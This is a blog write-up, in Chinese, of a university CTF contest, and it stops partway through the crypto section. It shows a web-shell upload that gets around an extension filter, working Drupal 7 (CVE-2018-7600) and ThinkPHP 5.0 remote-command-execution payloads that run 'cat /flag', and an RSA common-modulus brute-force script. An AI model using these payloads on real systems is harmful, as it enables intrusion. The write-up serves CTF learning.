<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="CUMTCTF双月赛Writeup"><meta name="keywords" content="CTF,Web,Writeup,Crypto"><meta name="author" content="Gard3nia"><meta name="copyright" content="Gard3nia"><title>CUMTCTF双月赛Writeup | Gard3nia's Notebook</title><link rel="shortcut icon" href="/rea.jpg"><link rel="stylesheet" href="/css/index.css?version=1.5.6"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.5.6"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第一次月赛"><span class="toc-number">2.</span> <span class="toc-text">第一次月赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-upload"><span class="toc-number">2.1.1.</span> <span class="toc-text">ez-upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE"><span class="toc-number">2.1.2.</span> <span class="toc-text">CVE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tp5"><span class="toc-number">2.1.3.</span> <span class="toc-text">tp5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">2.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#现代密码签到题"><span class="toc-number">2.2.1.</span> <span class="toc-text">现代密码签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#古典密码签到题"><span class="toc-number">2.2.2.</span> <span class="toc-text">古典密码签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#First-level"><span class="toc-number">2.2.3.</span> <span class="toc-text">First level</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第二次月赛"><span class="toc-number">3.</span> <span class="toc-text">第二次月赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-1"><span class="toc-number">3.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#签到题"><span class="toc-number">3.1.1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleUpload"><span class="toc-number">3.1.2.</span> <span class="toc-text">SimpleUpload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#小型线上赌场"><span class="toc-number">3.1.3.</span> <span class="toc-text">小型线上赌场</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleSQLi"><span class="toc-number">3.1.4.</span> <span class="toc-text">SimpleSQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件管理系统"><span class="toc-number">3.1.5.</span> <span class="toc-text">文件管理系统</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-1"><span class="toc-number">3.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#现代密码签到"><span class="toc-number">3.2.1.</span> <span class="toc-text">现代密码签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#古典密码签到"><span class="toc-number">3.2.2.</span> <span class="toc-text">古典密码签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyrsa"><span class="toc-number">3.2.3.</span> <span class="toc-text">easyrsa</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">3.3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc签到"><span class="toc-number">3.3.1.</span> <span class="toc-text">Misc签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BXS图标真好看"><span class="toc-number">3.3.2.</span> <span class="toc-text">BXS图标真好看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base全家桶了解一下"><span class="toc-number">3.3.3.</span> <span class="toc-text">base全家桶了解一下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#起床改error啦"><span class="toc-number">3.3.4.</span> <span class="toc-text">起床改error啦</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第三次月赛"><span class="toc-number">4.</span> <span class="toc-text">第三次月赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-2"><span class="toc-number">4.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web签到"><span class="toc-number">4.1.1.</span> <span class="toc-text">Web签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web签到2"><span class="toc-number">4.1.2.</span> <span class="toc-text">Web签到2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析："><span class="toc-number">4.1.2.1.</span> <span class="toc-text">分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass1"><span class="toc-number">4.1.2.2.</span> <span class="toc-text">bypass1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass2"><span class="toc-number">4.1.2.3.</span> <span class="toc-text">bypass2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass3"><span class="toc-number">4.1.2.4.</span> <span class="toc-text">bypass3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp："><span class="toc-number">4.1.2.5.</span> <span class="toc-text">exp：</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gard3nia</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">21</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">10</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">friendlinks</div><a class="author-info-links__name text-center" href="https://skysec.top">一叶飘零学长</a><a class="author-info-links__name text-center" href="https://0verwatch.top/">0verwatch</a><a class="author-info-links__name text-center" href="http://chaosec.top/">瑞雪师傅</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://s2.ax1x.com/2019/05/26/VE5mHf.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gard3nia's Notebook</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">时间轴</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">归档</a><a class="site-page" href="/about">简介</a></span></div><div id="post-info"><div id="post-title">CUMTCTF双月赛Writeup</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-01-14</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">4.2k</span><span class="post-meta__separator">|</span><span>Reading time: 18 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>萌新入坑的校赛~<a id="more"></a></p>
<h1 id="第一次月赛"><a href="#第一次月赛" class="headerlink" title="第一次月赛"></a>第一次月赛</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h3><p>题目描述是可以上传图片的，就随手上传一张图片上去<br><img src="https://s1.ax1x.com/2018/12/16/FdJD6P.png" alt=""></p>
<p>回显出目录结构如下：<br><img src="https://s1.ax1x.com/2018/12/16/FdJym8.png" alt=""></p>
<p>访问URL发现可以看到上传的图片：<br><img src="https://s1.ax1x.com/2018/12/16/FdNWfH.png" alt=""><br>知道了上传目录，现在要做的就是上传成功一个Web Shell。</p>
<p>连接Cknife，写了个php小马，上传发现不可以上传以php结尾的文件。</p>
<p>第一次抓包尝试加00截断，未果。</p>
<p>第二次将后缀改成1.php.abc可以成功上传，但是设置Cknife需要连接的时候发现connection：close，应该是不能将上传的1.php.abc成功解析,未果。</p>
<p>第三次将后缀改成php5，可以上传成功，连接Cknife，成功进入，应该这次可以将haha.php5成功解析：<br><img src="https://s1.ax1x.com/2018/12/16/Fdd9FU.png" alt=""><br><img src="https://s1.ax1x.com/2018/12/16/Fdaxe0.png" alt=""></p>
<p>在upload文件夹中找了半天，全都是别人上传的文件，最后在根目录发现了flag：<br><img src="https://s1.ax1x.com/2018/12/16/FddrXn.png" alt=""><br><img src="https://s1.ax1x.com/2018/12/16/Fdw8CF.png" alt=""></p>
<h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>hint不需要扣分，就窥视了一下，提示是drupal7的CVE漏洞。</p>
<p>Google一波，看看大佬写的博客，贴个链接：</p>
<p><a href="https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#Drupal7-" target="_blank" rel="noopener">https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#Drupal7-</a></p>
<p><a href="https://www.jianshu.com/p/7c410db788ed" target="_blank" rel="noopener">https://www.jianshu.com/p/7c410db788ed</a></p>
<p>先创建账号，发现不可以发送email，Google到的结果告诉我更换新密码的页面是存在漏洞的，所以输入用户名的时候直接拿bp截断，构造post：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?q=user%2Fpassword&amp;name%5B%23post_render%5D%5B%5D=system&amp;name%5B%23markup%5D=ls%20/&amp;name%5B%23type%5D=markup</span><br><span class="line"></span><br><span class="line">form_id=user_pass&amp;_triggering_element_name=name</span><br></pre></td></tr></table></figure>
<p>这里原来的命令需要修改，将其改为ls%20/，目的是查看根目录，Go一下回显form_build_id：</p>
<p><img src="https://s1.ax1x.com/2018/12/16/FdWuDO.png" alt=""></p>
<p>保留这个form_build_id，用Hackbar post一下这个form_build_id，如下图：</p>
<p><img src="https://s1.ax1x.com/2018/12/16/FdW2rT.png" alt=""></p>
<p>抓包截断，go一下回显根目录，发现flag文件，</p>
<p><img src="https://s1.ax1x.com/2018/12/16/FdWsGn.png" alt=""></p>
<p>下一步就是尝试打开这个flag文件，所以重复上述操作，将之前的ls命令换成<code>cat%20/flag</code>即可。（需要注意的是这里的空格需要使用url编码%20，之前没有注意到这个点，导致回显不出数据）</p>
<p><img src="https://s1.ax1x.com/2018/12/16/FdWECR.png" alt=""></p>
<p><img src="https://s1.ax1x.com/2018/12/16/FdWiE4.png" alt=""></p>
<h3 id="tp5"><a href="#tp5" class="headerlink" title="tp5"></a>tp5</h3><p>是个新题正好是前段时间爆出来的新漏洞：ThinkPHP 5.0 &amp; 5.1远程命令执行漏洞，前些日子看合天公众号推送了一篇类似的文章正好派上用场：<a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652849500&amp;idx=1&amp;sn=faf67baccbc970a179e679ea378fdc92&amp;chksm=bd5939918a2eb087cd34eff02f4bb0186190f15dda841e299923717de222df913db1a89acb1d&amp;mpshare=1&amp;scene=23&amp;srcid=1216eedEBA61VyEXXfPPHC1R#rd" target="_blank" rel="noopener">click here</a></p>
<p>题目提示是tp5.0版本，文章直接有payload：</p>
<p><code>命令执行：</code></p>
<p><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=[系统命令]</code></p>
<p>先<code>ls /</code>列出根目录下的所有目录，发现flag文件；</p>
<p><a href="https://imgchr.com/i/Fxggu6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/14/Fxggu6.md.png" alt="Fxggu6.md.png"></a></p>
<p>然后直接查看flag文件即可：</p>
<p><img src="https://s2.ax1x.com/2019/01/14/FxgqDf.png" alt="FxgqDf.png"></p>
<p>payload:</p>
<p><code>http://219.219.61.234:10005/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</code></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>之前还没有认真学习过密码学的东西，好在期末好好复习了密码学，现在已经对密码学的知识有了个初步的认识，来温习一下上次的crypto</p>
<h3 id="现代密码签到题"><a href="#现代密码签到题" class="headerlink" title="现代密码签到题"></a>现代密码签到题</h3><p>拿到这题，看到<code>n,c1,c2,e1,e2</code>基本已经锁定这一题就是RSA的共模攻击，但是所给的参数全部都是字母，按理说应该都是数字才对，所以最难的工作就是将这一堆的字母转化为可用的数字；</p>
<p>先统计一下字母的出现频率：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">n=<span class="string">"ZZTOBOTBBISBBSOIIAbZAbZOAgObAEEgIBSBgBTIZAEgZTTZZbBEIOTEASTBBBAOEIZgETBSATESOZgZAZOZbTOIbSSIBIgOSZAEOTTgOOATSSBAbbAgOAAOOIOZAIAIABSZBEZBbABEIEOTOZbIbOSTZTAbgBATEbIIIAgSOBTgBBbgTObEATSOIgEISBEIITbEZTIOTOOTBTZZBOIbABOIZTbTTEgEbAggZgSEOAIbSgBbBbOZTESAZIbAZZSbSgEAASgOISIbIgZTbIEbOTgOZBEISAZBSTgTTBSgbIZSgbZBZESEbTgEZTTTEEOETZTOOAAOTZbZIgTZEISBbEZASggIBIgBESTZbZZAOASgOESAOBASAITBBObZZbZIbASIOIAObOSBbBIZZAIOEBBOgOITAAZOIATTSZAOBSSAIZgTBgTbOgOZEOOBgBOAbZTEgOgOOTBSZBIBATAOEOTTObggbATbATEbEOISIOZIIBgSbTETbTEgAIESAZITbgZbgbOAAgbgbgSEOBSObAEbSTEIAZSbSSTEABTSBESOTOETESbgAABABOEgBbAEBZEEgZIbZbbbTObTESbTABBBTISOBgZSEIIISABOI"</span></span><br><span class="line">c1=<span class="string">"ZZEZZOESZTSbbEZETOAIbAbBgETTOASIgEESOgEZATOIgIEABAEOEEEBOTbZIObOESAZbIZTSBgSbZbZBbgbAOBZZABbATOIZIIAgAZAABSSTIEbIOOTAZIZgEbTSSIbEEBBZZIgSZBOEIETgAggIIEbOABIAOgIBBAZATIZIgBAOZbESEbEEBBBbZSOAgZbBZTEgAEbAIOOIEAEbbSIIbITZOTZSBSSABABbbbgOOBATBBTZIEAgSSSbbZOIgBTgOBISOIIIEZZZggbIZEEOSSEEOOgEZSgbAETTTgBBgZTOEIbISZIBSZBOSgSbBIIZIgSbEBBEEIZBgbEEOISbZgBbZIbTAbBAESEgIgSATSSBIZTgZOgZSTObBAZBOBgIATbZIggOIIOSAgSSBIbSEAgTTbTSZbTEgSOOgSTSEATBZOEBTOTEABEgZBAZSObbSEbEbIABZTTABgZETOgbgSZOTAOEOAZBTASbSSSSOBgEEETZTBZEZTSObSbgOIOTTZSETAgTSAITbAEIIAZgOSZZIbZgIIgBgEZOgZbITTgZbASZSEgOIATBgIOBOISgZBTBZOESbABbIIIBgIZOASAbAgSgBEZSbbOSIEbI"</span></span><br><span class="line">c2=<span class="string">"IBTOZOIOOASIBTOISSSbSABbgIbAZEgAgBZBESbbgZbZIATZEOZIZTEIEOggEBbTSZZbASBSSSZIOAZSgTZAZgAIBAAgZTEAIOSESEBTgBSgEIOEbTIIBSAZbSbZEgOSObbBOSbbSTSIBOEZbgIObBBOTAbTbgOOEATBgOOTgIOggSgOZEgSIEgZSAAgTABBIAOTSgOAOITATISBSSTZBABATESSbAgOSbSASOObZbbATObAAgIZBAISBEATBTgbIgATZbbZSgTBgTBSgbZgZZZEBTOIIEAOTgTZOAIAZZBAIAObbIgEOTIAgSEOAbIZEAIOSZgBTASSbISgEOOZESEbBZEBOIAggZbgTTEESTIBbOBTASZTATSOOBAObAOAIgEbSOIISSAAZIIBEOETSOSbSEAbIZBbTEZTAOgBETOZTAOBZZbTIIABOASbIgAgTbbTIBASBbIZEbSTZBSbOAObIBTSbSEgOgSbTBZZEZBgIAObSEETTgTTEEAAAbAOESISIBTTSABTbAgBIggTBZbZEbEbITZbSTgTgBZBAEITgbEOBBBTZgAOTZEBAgbbSOgBTTZOAZBTOBZITIISZSTgBgOOTBbTEEIbgBEgT"</span></span><br><span class="line">e1=<span class="string">"IIIBTZBg"</span></span><br><span class="line">e2=<span class="string">"gbATZgI"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_each_char_1</span><span class="params">(string)</span>:</span></span><br><span class="line">    res = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            res[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res[i] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"n:"</span>+str((count_each_char_1(n)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c1:"</span>+str((count_each_char_1(c1)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c2:"</span>+str((count_each_char_1(c2)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"e1:"</span>+str((count_each_char_1(e1)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"e2:"</span>+str((count_each_char_1(e2)))</span><br></pre></td></tr></table></figure>
<p><strong>Result</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n:&#123;&apos;A&apos;: 65, &apos;B&apos;: 63, &apos;E&apos;: 56, &apos;g&apos;: 52, &apos;I&apos;: 60, &apos;O&apos;: 72, &apos;S&apos;: 56, &apos;b&apos;: 62, &apos;T&apos;: 69, &apos;Z&apos;: 62&#125;</span><br><span class="line">c1:&#123;&apos;A&apos;: 55, &apos;b&apos;: 62, &apos;E&apos;: 66, &apos;g&apos;: 60, &apos;I&apos;: 67, &apos;O&apos;: 58, &apos;S&apos;: 65, &apos;B&apos;: 59, &apos;T&apos;: 53, &apos;Z&apos;: 72&#125;</span><br><span class="line">c2:&#123;&apos;A&apos;: 67, &apos;B&apos;: 61, &apos;E&apos;: 51, &apos;g&apos;: 60, &apos;I&apos;: 57, &apos;O&apos;: 63, &apos;S&apos;: 66, &apos;b&apos;: 63, &apos;T&apos;: 70, &apos;Z&apos;: 59&#125;</span><br><span class="line">e1:&#123;&apos;I&apos;: 3, &apos;Z&apos;: 1, &apos;B&apos;: 2, &apos;T&apos;: 1, &apos;g&apos;: 1&#125;</span><br><span class="line">e2:&#123;&apos;A&apos;: 1, &apos;b&apos;: 1, &apos;g&apos;: 2, &apos;I&apos;: 1, &apos;T&apos;: 1, &apos;Z&apos;: 1&#125;</span><br></pre></td></tr></table></figure>
<p>发现总共就出现了10个字母<code>A,B,E,g,I,O,S,b,T,Z</code>,猜想这10个字母对应的是0-9的10个数字，如何将字母和数字进行对应是个头疼的问题；想了半天，没办法，只能暴力破解，产生字母的全排列对应10个数字…</p>
<p><strong>暴力破解脚本</strong>(借鉴队友脚本学习了一下)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	dic_alp1=[<span class="string">'O'</span>,<span class="string">'T'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'b'</span>,<span class="string">'Z'</span>,<span class="string">'I'</span>,<span class="string">'E'</span>,<span class="string">'S'</span>,<span class="string">'g'</span>]</span><br><span class="line">	dic_num=[<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">	dic_alp2=list(itertools.permutations(dic_alp1))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> dic_alp2:</span><br><span class="line">		n=<span class="string">"ZZTOBOTBBISBBSOIIAbZAbZOAgObAEEgIBSBgBTIZAEgZTTZZbBEIOTEASTBBBAOEIZgETBSATESOZgZAZOZbTOIbSSIBIgOSZAEOTTgOOATSSBAbbAgOAAOOIOZAIAIABSZBEZBbABEIEOTOZbIbOSTZTAbgBATEbIIIAgSOBTgBBbgTObEATSOIgEISBEIITbEZTIOTOOTBTZZBOIbABOIZTbTTEgEbAggZgSEOAIbSgBbBbOZTESAZIbAZZSbSgEAASgOISIbIgZTbIEbOTgOZBEISAZBSTgTTBSgbIZSgbZBZESEbTgEZTTTEEOETZTOOAAOTZbZIgTZEISBbEZASggIBIgBESTZbZZAOASgOESAOBASAITBBObZZbZIbASIOIAObOSBbBIZZAIOEBBOgOITAAZOIATTSZAOBSSAIZgTBgTbOgOZEOOBgBOAbZTEgOgOOTBSZBIBATAOEOTTObggbATbATEbEOISIOZIIBgSbTETbTEgAIESAZITbgZbgbOAAgbgbgSEOBSObAEbSTEIAZSbSSTEABTSBESOTOETESbgAABABOEgBbAEBZEEgZIbZbbbTObTESbTABBBTISOBgZSEIIISABOI"</span></span><br><span class="line">		c1=<span class="string">"ZZEZZOESZTSbbEZETOAIbAbBgETTOASIgEESOgEZATOIgIEABAEOEEEBOTbZIObOESAZbIZTSBgSbZbZBbgbAOBZZABbATOIZIIAgAZAABSSTIEbIOOTAZIZgEbTSSIbEEBBZZIgSZBOEIETgAggIIEbOABIAOgIBBAZATIZIgBAOZbESEbEEBBBbZSOAgZbBZTEgAEbAIOOIEAEbbSIIbITZOTZSBSSABABbbbgOOBATBBTZIEAgSSSbbZOIgBTgOBISOIIIEZZZggbIZEEOSSEEOOgEZSgbAETTTgBBgZTOEIbISZIBSZBOSgSbBIIZIgSbEBBEEIZBgbEEOISbZgBbZIbTAbBAESEgIgSATSSBIZTgZOgZSTObBAZBOBgIATbZIggOIIOSAgSSBIbSEAgTTbTSZbTEgSOOgSTSEATBZOEBTOTEABEgZBAZSObbSEbEbIABZTTABgZETOgbgSZOTAOEOAZBTASbSSSSOBgEEETZTBZEZTSObSbgOIOTTZSETAgTSAITbAEIIAZgOSZZIbZgIIgBgEZOgZbITTgZbASZSEgOIATBgIOBOISgZBTBZOESbABbIIIBgIZOASAbAgSgBEZSbbOSIEbI"</span></span><br><span class="line">		c2=<span class="string">"IBTOZOIOOASIBTOISSSbSABbgIbAZEgAgBZBESbbgZbZIATZEOZIZTEIEOggEBbTSZZbASBSSSZIOAZSgTZAZgAIBAAgZTEAIOSESEBTgBSgEIOEbTIIBSAZbSbZEgOSObbBOSbbSTSIBOEZbgIObBBOTAbTbgOOEATBgOOTgIOggSgOZEgSIEgZSAAgTABBIAOTSgOAOITATISBSSTZBABATESSbAgOSbSASOObZbbATObAAgIZBAISBEATBTgbIgATZbbZSgTBgTBSgbZgZZZEBTOIIEAOTgTZOAIAZZBAIAObbIgEOTIAgSEOAbIZEAIOSZgBTASSbISgEOOZESEbBZEBOIAggZbgTTEESTIBbOBTASZTATSOOBAObAOAIgEbSOIISSAAZIIBEOETSOSbSEAbIZBbTEZTAOgBETOZTAOBZZbTIIABOASbIgAgTbbTIBASBbIZEbSTZBSbOAObIBTSbSEgOgSbTBZZEZBgIAObSEETTgTTEEAAAbAOESISIBTTSABTbAgBIggTBZbZEbEbITZbSTgTgBZBAEITgbEOBBBTZgAOTZEBAgbbSOgBTTZOAZBTOBZITIISZSTgBgOOTBbTEEIbgBEgT"</span></span><br><span class="line">		e1=<span class="string">"IIIBTZBg"</span></span><br><span class="line">		e2=<span class="string">"gbATZgI"</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">			n=n.replace(x[i],dic_num[i])</span><br><span class="line">			c1=c1.replace(x[i],dic_num[i])</span><br><span class="line">			c2=c2.replace(x[i],dic_num[i])</span><br><span class="line">			e1=e1.replace(x[i],dic_num[i])</span><br><span class="line">			e2=e2.replace(x[i],dic_num[i])</span><br><span class="line"></span><br><span class="line">		n=int(n,<span class="number">10</span>)</span><br><span class="line">		c1=int(c1,<span class="number">10</span>)</span><br><span class="line">		c2=int(c2,<span class="number">10</span>)</span><br><span class="line">		e1=int(e1,<span class="number">10</span>)</span><br><span class="line">		e2=int(e2,<span class="number">10</span>)</span><br><span class="line">		<span class="keyword">if</span> gmpy2.gcd(e1,e2)!=<span class="number">1</span>:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			mgcd,s,t=gmpy2.gcdext(e1,e2)</span><br><span class="line">			<span class="keyword">if</span> s&lt;<span class="number">0</span>:</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">					s=-s</span><br><span class="line">					c1=gmpy2.invert(c1,n)</span><br><span class="line">				<span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">					<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">if</span> t&lt;<span class="number">0</span>:</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">					t=-t</span><br><span class="line">					c2=gmpy2.invert(c2,n)</span><br><span class="line">				<span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">					<span class="keyword">continue</span></span><br><span class="line">			plain=pow(c1,s,n)*pow(c2,t,n)%n</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				ans = <span class="string">'&#123;:x&#125;'</span>.format(plain).decode(<span class="string">'hex'</span>)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> ans:</span><br><span class="line">					<span class="keyword">print</span> ans</span><br><span class="line">					<span class="keyword">print</span> x</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">except</span> TypeError:</span><br><span class="line">				<span class="keyword">pass</span></span><br><span class="line">			</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>先用出现字母的全排列对应表0-9这10个数，然后将所有参数用数字表示，用RSA的共模攻击求出最后的结果，发现flag：</p>
